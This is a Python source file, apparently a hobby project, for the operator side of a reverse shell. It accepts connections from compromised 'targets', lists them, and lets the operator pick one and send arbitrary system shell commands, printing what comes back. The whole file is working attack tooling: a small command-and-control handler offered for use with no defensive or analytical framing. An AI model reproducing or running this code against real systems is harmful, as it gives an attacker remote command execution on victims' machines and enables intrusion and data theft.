import threading
import socket
import time
from server import Server


class ReverseShell:
    """
    Handles client connections.
    """
    server: Server

    # Conn objects stored from accepting client connections
    connections = [socket.socket()]
    # Client address referenced to connections by index
    client_addr = [('192.168.0.98', 61766)]

    def accept_conn(self):
        while True:
            conn, addr = self.server.accept_conn()
            self.connections.append(conn)
            self.client_addr.append(addr)

    def list_clients(self):
        """
        List all available clients connected to the server.
        :return:
        """
        for i, client in enumerate(self.client_addr):
            try:
                # Sends data to client to confirm connectivity
                # TODO: Use test case to do the below (refer Corey's YT)
                self.connections[i].send(''.encode())
            except socket.error:
                del self.connections[i]
                del self.client_addr[i]
            print("-------------Available targets-------------")
        if not self.client_addr:
            print("No client connections found")
        else:
            for i, client in enumerate(self.client_addr):
                print(f"{i + 1} {client[0]}:{client[1]}")

    def help_menu(self):
        print("""Help Menu 
        \nAll kinds of system shell commands are supported based on the OS connected to
        \nto quit type 'quit' or 'exit'""")

    def handle_target(self, target):
        """
        Handle selected target.

        :param target:
        :return:
        """
        conn = self.connections[target]
        address = self.client_addr[target]
        print(f"Reverse Shell Interpreter started\nTarget IP: {address[0]}\nTarget PORT: {address[1]}")
        while True:
            conn.send(str(len('os.getcwd()')).encode('utf-8'))
            conn.send('os.getcwd()'.encode('utf-8'))
            print(conn.recv(2048).decode('utf-8'), end='')
            cmd = input()
            if cmd == '?':
                self.help_menu()
            elif cmd == 'exit' or cmd == 'quit':
                # TODO: Try not to close client conn (refactor exception handling in client.py:56)
                cmd_length = len(cmd)
                conn.send(str(cmd_length).encode('utf-8'))
                conn.send(cmd.encode('utf-8'))
                conn.close()
                break
            else:
                cmd_length = len(cmd)
                conn.send(str(cmd_length).encode('utf-8'))
                conn.send(cmd.encode('utf-8'))
                data = conn.recv(1024)
                if data != '':
                    print(data.decode('utf-8'))

    def run(self):
        global HOST, PORT
        self.server = Server(HOST, PORT)
        self.server.create_socket()
        self.server.server_listen(5)
        # Create a thread to accept incoming connections
        # TODO: Use multiprocessing
        thread = threading.Thread(target=self.accept_conn)
        thread.daemon = True
        thread.start()
        print("REVERSE SHELL BY B0YD")
        while True:
            cmd = (input('> ')).strip()
            if cmd == 'list':
                self.list_clients()
            elif 'select' in cmd:
                target = cmd[7:]
                # Handle target specified with command 'select [target]'
                self.handle_target(int(target) - 1)
            elif cmd == 'quit' or cmd == 'exit':
                self.server.kill_server()
                break
            else:
                print(f"'{cmd}' not found")


if __name__ == '__main__':
    HOST = '127.0.0.1'
    PORT = 55555
    app = ReverseShell()
    app.run()
    print("Script Ended")